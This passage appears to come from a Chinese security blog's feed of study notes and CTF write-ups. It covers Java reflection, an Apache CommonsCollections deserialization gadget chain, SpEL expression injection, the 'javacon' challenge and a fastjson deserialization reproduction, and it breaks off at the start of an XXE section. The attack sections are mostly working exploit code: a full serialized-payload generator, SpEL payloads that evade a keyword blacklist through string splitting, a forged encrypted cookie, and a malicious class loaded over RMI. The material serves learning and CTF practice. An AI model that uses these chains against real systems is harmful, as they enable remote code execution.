class="comment">// 加载 java.lang.Runtime类</span></span><br><span class="line">Method method1 = clazz.getMethod(<span class="string">"getRuntime"</span>);    <span class="comment">//获取到getRuntime方法</span></span><br><span class="line">Runtime runtime = (Runtime) method1.invoke(<span class="keyword">null</span>);  <span class="comment">//调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)</span></span><br><span class="line"><span class="comment">//runtime.exec("calc") 即可</span></span><br><span class="line">Method method2 = clazz.getMethod(<span class="string">"exec"</span>, String<span class="class">.<span class="keyword">class</span>)</span>; <span class="comment">//得到exec方法</span></span><br><span class="line">method2.invoke(runtime, <span class="string">"calc"</span>); <span class="comment">//调用exec方法</span></span><br></pre></td></tr></table></figure><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>java的反序列化是通过<code>ObjectOutputStream</code>和<code>ObjectInputStream</code>两个类来实现的，同时要序列化的类必须实现<code>Serializable</code>接口</p><p>与PHP类似，Java在序列化一个对象的时候会调用<code>writeObject</code>方法，在反序列化一个对象的时候会调用<code>readObject</code>方法</p><h2 id="Apache-CommonsCollections反序列化"><a href="#Apache-CommonsCollections反序列化" class="headerlink" title="Apache CommonsCollections反序列化"></a>Apache CommonsCollections反序列化</h2><p>只要弄懂了反射的逻辑，那么理解 <code>CommonsCollections</code> 的payload也就不难了,重点在构造 <code>transformers</code> 数组的时候</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>), </span></span><br><span class="line">        new InvokerTransformer("getMethod", new Class[]&#123;</span><br><span class="line">                String.class, Class[].class&#125;, new Object[]&#123;</span><br><span class="line">                <span class="string">"getRuntime"</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                Object.class, Object[].class&#125;, new Object[]&#123;null,new Object[0]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;</span><br><span class="line">                String.class&#125;, new Object[]&#123;"calc"&#125;)&#125;;</span><br><span class="line"></span><br><span class="line">Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">transformedChain.transform(transformers);  <span class="comment">//触发</span></span><br></pre></td></tr></table></figure><p><code>transformers</code> 数组中的每一个对象都会调用一次 <code>transform</code> 函数，<code>ConstantTransformer</code> 直接返回了 <code>Runtime.class</code>  作为下一个 <code>transform</code> 的参数 等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);  &#x2F;&#x2F; 加载 java.lang.Runtime类</span><br></pre></td></tr></table></figure><p>之后 <code>InvokerTransformer</code> 的 <code>transform</code> 接收传过来的 <code>Runtime.class</code> 去调用其 <code>getMethod</code>方法，等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method method1 &#x3D; clazz.getMethod(&quot;getRuntime&quot;);    &#x2F;&#x2F;获取到getRuntime方法</span><br></pre></td></tr></table></figure><p>返回了一个 <code>Method</code>类型的作为下一次 <code>transform</code> 的参数，之后的过程就是分别调用 <code>invoke</code> 和 <code>exec</code> 方法，等价于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime runtime &#x3D; (Runtime) method1.invoke(null);  &#x2F;&#x2F;调用，得到Runtime对象(其实可以直接拿这个对象去调用exec了)</span><br><span class="line">runtime.exec(&quot;calc&quot;)</span><br></pre></td></tr></table></figure><p>由于 <code>getRuntime</code> 方法是静态的， <code>invoke</code> 的时候第一个参数不必是类的实例，之后由于已经获取到了 <code>Runtime</code> 的实例就不再需要通过反射去获得 <code>exec</code> 方法再 <code>invoke</code> 了，省去了一点麻烦的步骤</p><p><code>getMethod</code> 和 <code>invoke</code> 方法的原型，所以我们在反射的时候也需要指定这些参数的class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Method <span class="title">getMethod</span><span class="params">(String name, Class&lt;?&gt;... parameterTypes)</span></span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object obj, Object... args)</span></span></span><br></pre></td></tr></table></figure><p>但是实际上我们在调用 <code>getMethod</code> 的时候，只需要指定第一个参数为 <code>getRuntime</code> 即可，那么第二个参数我们可以设为 null 或者 <code>new Class[0]</code> ，同理， invoke 方法这里不需要指定参数可以将两个参数都设置为 null</p><p>理解一下 <code>collections.map.TransformedMap</code> 这个类，提供了一个 <code>decorateTransform</code> 方法，可以将普通的map转化为 <code>TransformedMap</code> ，这个函数的原型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorateTransform</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span></span><br></pre></td></tr></table></figure><p>第二个和第三个参数都是 <code>Transformer</code> 类型的，也就是每次更新map的时候，比如对map执行 put操作的时候</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">    key = transformKey(key);</span><br><span class="line">    value = transformValue(value);</span><br><span class="line">    <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>会针对 key 和 value 执行 transform 操作</p><p>结合之前的 payload, 我们可以编写这个代码弹出计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                        String.class, Class[].class&#125;, new Object[] &#123;</span><br><span class="line">                        <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">null</span> &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class &#125;, new Object[] &#123;"calc.exe"&#125;)&#125;;</span><br><span class="line">        Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap(); </span><br><span class="line">        Map outMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformedChain); <span class="comment">//转变为 TransformedMap 操作</span></span><br><span class="line">        outMap.put(<span class="string">"key"</span>, <span class="string">"value"</span>);<span class="comment">//触发payload</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是网上给的payload都是针对 <code>setValue</code> 方法触发的payload，这是怎么找到的</p><p>经过调试我发现 <code>AbstractMapEntryDecorator</code> 实现了 <code>Map</code>，其中的  <code>setValue</code> 是这么写的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> entry.setValue(object);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方法之后又被 <code>AbstractInputCheckedMapDecorator</code> 的内部 <code>MapEntry</code> 类重写</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">setValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    value = parent.checkSetValue(value); <span class="comment">//多了一次 checkSetValue 操作</span></span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个多出来的 <code>checkSetValue</code> 方法又是 <code>AbstractInputCheckedMapDecorator</code>  的，而 <code>TransformedMap</code> 正是重写了这个方法</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580461320232.png" alt></p><p>所以实际上是的结果是调用了 <code>TransformedMap</code> 的 <code>checkSetValue</code> 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就能触发payload了</p><p>之后寻找能够触发 <code>setValue</code> 方法的类，这里利用了 <code>AnnotationInvocationHandler</code></p><p>不过这里只有jdk7才能运行，我开始用的jdk8不能成功</p><p>最后的测试代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.alibaba.dubbo.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.ObjectInstance;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.dubbo.common.serialize.ObjectInput;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@description</span>: 测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>: Pxy</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span>: 2020-01-31 16:21</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                    new InvokerTransformer("getMethod", new Class[] &#123;</span><br><span class="line">                            String.class, Class[].class&#125;, new Object[] &#123;</span><br><span class="line">                            <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                            Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">                            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                            String.class &#125;, new Object[] &#123;"calc.exe"&#125;)&#125;;</span><br><span class="line">            Transformer transformedChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">            Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            innerMap.put(<span class="string">"key"</span>, <span class="string">"value"</span>);</span><br><span class="line">            Map outMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformedChain);</span><br><span class="line">    </span><br><span class="line">            Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">            Constructor ctor = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">            ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object instance = ctor.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outMap</span>)</span>;</span><br><span class="line">            File f = <span class="keyword">new</span> File(<span class="string">"payload.bin"</span>);</span><br><span class="line">            ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">            out.writeObject(instance);</span><br><span class="line">            out.flush();</span><br><span class="line">            out.close();</span><br><span class="line"></span><br><span class="line">            ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"payload.bin"</span>));</span><br><span class="line">            input.readObject();</span><br><span class="line">            input.close();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>先断在这个 <code>AnnotationInvocationHandler</code> 类中</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580469219896.png" alt></p><p>然后触发 <code>checkSetValue</code> 方法</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580469249634.png" alt="1580469249634"></p><p>最后成功弹出计算器</p><h2 id="SPEL表达式注入"><a href="#SPEL表达式注入" class="headerlink" title="SPEL表达式注入"></a>SPEL表达式注入</h2><p>类似于 jinja 表达式，不过更为强大</p><p>编写一个接口进行测试：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span>(<span class="string">"/spel"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">spel</span><span class="params">(String input)</span> <span class="keyword">throws</span>  Exception</span>&#123;</span><br><span class="line">    SpelExpressionParser parser = <span class="keyword">new</span> SpelExpressionParser();</span><br><span class="line">    Expression expression = (Expression)parser.parseExpression(input);</span><br><span class="line">    <span class="keyword">return</span> expression.getValue().toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 <code>/spel?input=new java.lang.ProcessBuilder(&quot;calc&quot;).start()</code></p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580468482834.png" alt></p><h2 id="code-breaking-javacon"><a href="#code-breaking-javacon" class="headerlink" title="code-breaking javacon"></a>code-breaking javacon</h2><p>这道题并不算难，结合了java反射和spel表达式注入</p><p>一个spring框架写的登陆界面，用户名和密码都是admin，有一个remember me可以勾选</p><p><code>application.yml</code>中有一些相关的设置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">keywords:</span></span><br><span class="line">  <span class="attr">blacklist:</span> </span><br><span class="line">    <span class="bullet">-</span> <span class="string">java.+lang</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">Runtime</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">exec.*\(</span></span><br><span class="line"><span class="attr">user:</span></span><br><span class="line">  <span class="attr">username:</span> <span class="string">admin</span></span><br><span class="line">  <span class="attr">password:</span> <span class="string">admin</span></span><br><span class="line">  <span class="attr">rememberMeKey:</span> <span class="string">c0dehack1nghere1</span></span><br></pre></td></tr></table></figure><p>有一个黑名单过滤了一些字符，不过可以很容易地用字符串拼接进行绕过</p><p>仔细分析代码，其中有存在一处类似模板渲染的语句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ParserContext parserContext = <span class="keyword">new</span> TemplateParserContext();</span><br><span class="line">Expression exp = parser.parseExpression(val, parserContext);</span><br><span class="line">SmallEvaluationContext evaluationContext = <span class="keyword">new</span> SmallEvaluationContext();</span><br><span class="line"><span class="keyword">return</span> exp.getValue(evaluationContext).toString();</span><br></pre></td></tr></table></figure><blockquote><p>Spring Expression Language（简称SpEL）是一种强大的表达式语言，支持在运行时查询和操作对象图。语言语法类似于Unified EL，但提供了额外的功能，特别是方法调用和基本的字符串模板功能。同时因为SpEL是以API接口的形式创建的，所以允许将其集成到其他应用程序和框架中。</p></blockquote><p>这一处位于<code>getAdvanceValue</code>函数中，调用它的是这里：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">admin</span><span class="params">(@CookieValue(value = <span class="string">"remember-me"</span>, required = <span class="keyword">false</span>)</span> String rememberMeValue,</span></span><br><span class="line"><span class="function">                    HttpSession session,</span></span><br><span class="line"><span class="function">                    Model model) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (rememberMeValue != <span class="keyword">null</span> &amp;&amp; !rememberMeValue.equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        String username = userConfig.decryptRememberMe(rememberMeValue);</span><br><span class="line">        <span class="keyword">if</span> (username != <span class="keyword">null</span>) &#123;</span><br><span class="line">            session.setAttribute(<span class="string">"username"</span>, username);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Object username = session.getAttribute(<span class="string">"username"</span>);</span><br><span class="line">    <span class="keyword">if</span>(username == <span class="keyword">null</span> || username.toString().equals(<span class="string">""</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/login"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    model.addAttribute(<span class="string">"name"</span>, getAdvanceValue(username.toString()));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里相当于是admin的管理界面，首先会检查<code>rememberMeValue</code>的值，并且尝试去解密其中的用户名，同时加入到<code>session</code>中，之后执行<code>model.addAttribute(&quot;name&quot;, getAdvanceValue(username.toString()));</code></p><p>那么这里的关键就是<code>cookie</code>中的rememberMeValue，由于我们已经知道了加密的算法和密钥(代码都是直接给的)，那么就可以通过伪造<code>rememberMeValue</code>来达到rce</p><p>首先需要一条java的反射链，因为要绕过一些关键字：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("ex"+"ec",String.class).invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime").getMethod("getRu"+"ntime").invoke(String.class.getClass().forName("java.l"+"ang.Ru"+"ntime")),"calc")</span><br></pre></td></tr></table></figure><p>之后要将其构造成Spel表达式，就是增加一个<code>T()</code></p><p>先本地测试弹一个计算器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(Encryptor.encrypt(<span class="string">"c0dehack1nghere1"</span>, <span class="string">"0123456789abcdef"</span>, <span class="string">"#&#123;T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"ex\"+\"ec\",T(String[])).invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\").getMethod(\"getRu\"+\"ntime\").invoke(T(String).getClass().forName(\"java.l\"+\"ang.Ru\"+\"ntime\")),new String[]&#123;\"calc\"&#125;)&#125;"</span>)); <span class="comment">//注意java的字符串必须是双引号</span></span><br></pre></td></tr></table></figure><p>生成payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bvik1nAmjEAllRdn5UKWGC9uCj0hW0P2B6k1uigkS1acKxD9b_xNi-x09UGgjU1DvDEI2GGk4Jn0ApM_cSVc0G7kGnvvtewNRVsfqFUCR0fMAPqbj6yqACW6XVtt8Fp1nBwebKd7pkYSZCv6Yj3X7H-0-8HDV6F3sS3yWHUQEBPAyiNmKfkSKUV5VVlNdo16Nij8YX8HvKdeMHJ7_5Sdjfmfq3dKPeUOivMyVp_GdEkffgly4YX4eWCOzQRr4uQgodsKw2pC9N9udnw3Fz7O5ZhzmoYttjLubBowMtkF-Q6HHCvBrK9SWCzRQXC6jqYX_XeqyZuDreUixnpXpzlN9Gj_AWy8DB8Dxea8atf2wr8&#x3D;</span><br></pre></td></tr></table></figure><p>之后登陆再替换掉cookie</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1573973547431-1580346732870.png" alt="结果"></p><h2 id="fastjson-反序列化-仅复现"><a href="#fastjson-反序列化-仅复现" class="headerlink" title="fastjson 反序列化(仅复现)"></a>fastjson 反序列化(仅复现)</h2><p>docker开启环境之后，首先需要生成一个 <code>TouchFile</code> 恶意文件，然后编译成class文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// javac TouchFile.java</span></span><br><span class="line"><span class="keyword">import</span> java.lang.Runtime;</span><br><span class="line"><span class="keyword">import</span> java.lang.Process;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TouchFile</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime rt = Runtime.getRuntime();</span><br><span class="line">            String[] commands = &#123;<span class="string">"touch"</span>, <span class="string">"/tmp/success"</span>&#125;;</span><br><span class="line">            Process pc = rt.exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// do nothing</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用python开一个服务器，监听8001端口</p><p>再开启一个rmi服务器，靶机ip为192.168.99.100，本机相对靶机是192.168.99.1</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580469670376.png" alt></p><p>这时候将payload发送过去，payload只是演示了在 tmp 目录下创建文件</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580469645918.png" alt></p><p>创建成功</p><p><img src= "/img/loading.gif" data-src="/posts/21b61fbe/1580469708254.png" alt></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.chaitin.cn/2015-11-11_java_unserialize_rce/#h4.1_%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B%E6%A6%82%E8%BF%B0" target="_blank" rel="noopener">Java反序列化漏洞通用利用分析</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE复习</title>
      <link href="/posts/2e545689/"/>
      <url>/posts/2e545689/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><h2 id="常用payload分析"><a href="#常用payload分析" class="headerlink" title="常用payload分析"></a>常用payload分析</h2><p>好像大家都用这个测试代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">$xmlfile = file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$creds = simplexml_import_dom($dom);</span><br><span class="line">var_dump($creds);</span><br></pre></td></tr></table></figure><p>使用XML发送数据：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">root</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://localhost:8887/aaaaa"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span><span class="symbol">&amp;a;</span><span class="tag">&lt;/<span 